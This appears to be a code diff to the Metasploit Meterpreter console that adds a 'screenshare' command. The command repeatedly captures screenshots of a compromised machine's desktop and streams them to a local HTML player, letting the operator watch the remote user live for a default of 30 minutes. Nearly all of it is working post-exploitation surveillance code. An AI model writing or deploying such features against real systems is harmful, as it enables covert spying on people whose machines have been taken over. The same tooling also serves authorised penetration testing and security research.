@@ -16,6 +16,7 @@ class Console::CommandDispatcher::Stdapi::Ui
   Klass = Console::CommandDispatcher::Stdapi::Ui
 
   include Console::CommandDispatcher
+  include Console::CommandDispatcher::Stdapi::Stream
 
   #
   # List of supported commands.
@@ -31,6 +32,7 @@ class Console::CommandDispatcher::Stdapi::Ui
       "keyboard_send" => "Send keystrokes",
       "mouse"         => "Send mouse events",
       "screenshot"    => "Grab a screenshot of the interactive desktop",
+      "screenshare"   => "Watch the remote user's desktop in real time",
       "setdesktop"    => "Change the meterpreters current desktop",
       "uictl"         => "Control some of the user interface components"
       #  not working yet
@@ -47,6 +49,7 @@ class Console::CommandDispatcher::Stdapi::Ui
       "keyboard_send" => [ "stdapi_ui_send_keys" ],
       "mouse"         => [ "stdapi_ui_send_mouse" ],
       "screenshot"    => [ "stdapi_ui_desktop_screenshot" ],
+      "screenshare"   => [ "stdapi_ui_desktop_screenshot" ],
       "setdesktop"    => [ "stdapi_ui_desktop_set" ],
       "uictl"         => [
         "stdapi_ui_enable_mouse",
@@ -191,6 +194,81 @@ class Console::CommandDispatcher::Stdapi::Ui
   end
 
   #
+  # Screenshare the current interactive desktop.
+  #
+  def cmd_screenshare( *args )
+    stream_path = Rex::Text.rand_text_alpha(8) + ".jpeg"
+    player_path = Rex::Text.rand_text_alpha(8) + ".html"
+    quality = 50
+    view = true
+    duration = 1800
+
+    screenshare_opts = Rex::Parser::Arguments.new(
+      "-h" => [ false, "Help Banner." ],
+      "-q" => [ true, "The JPEG image quality (Default: '#{quality}')" ],
+      "-s" => [ true, "The stream file path (Default: '#{stream_path}')" ],
+      "-t" => [ true, "The stream player path (Default: #{player_path})"],
+      "-v" => [ true, "Automatically view the stream (Default: '#{view}')" ],
+      "-d" => [ true, "The stream duration in seconds (Default: 1800)" ] # 30 min
+    )
+
+    screenshare_opts.parse( args ) { | opt, idx, val |
+      case opt
+        when "-h"
+          print_line( "Usage: screenshare [options]\n" )
+          print_line( "View the current interactive desktop in real time." )
+          print_line( screenshare_opts.usage )
+          return
+        when "-q"
+          quality = val.to_i
+        when "-s"
+          stream_path = val
+        when "-t"
+          player_path = val
+        when "-v"
+          view = false if val =~ /^(f|n|0)/i
+        when "-d"
+          duration = val.to_i
+      end
+    }
+
+    print_status("Preparing player...")
+    html = stream_html_template('screenshare', client.sock.peerhost, stream_path)
+    ::File.open(player_path, 'wb') do |f|
+      f.write(html)
+    end
+
+    path = ::File.expand_path(player_path)
+    if view
+      print_status("Opening player at: #{path}")
+      Rex::Compat.open_file(path)
+    else
+      print_status("Please open the player manually with a browser: #{path}")
+    end
+
+    print_status("Streaming...")
+    begin
+      ::Timeout.timeout(duration) do
+        while client do
+          data = client.ui.screenshot( quality )
+
+          if data
+            ::File.open(stream_path, 'wb') do |f|
+              f.write(data)
+            end
+            data = nil
+          end
+        end
+      end
+    rescue ::Timeout::Error
+    end
+
+    print_status("Stopped")
+
+    return true
+  end
+
+  #
   # Enumerate desktops
   #
   def cmd_enumdesktops(*args)
@@ -201,7 +279,7 @@ class Console::CommandDispatcher::Stdapi::Ui
     desktopstable = Rex::Text::Table.new(
       'Header'  => "Desktops",
       'Indent'  => 4,
-      'Columns' => [	"Session",
+      'Columns' => [  "Session",
               "Station",
               "Name"
             ]
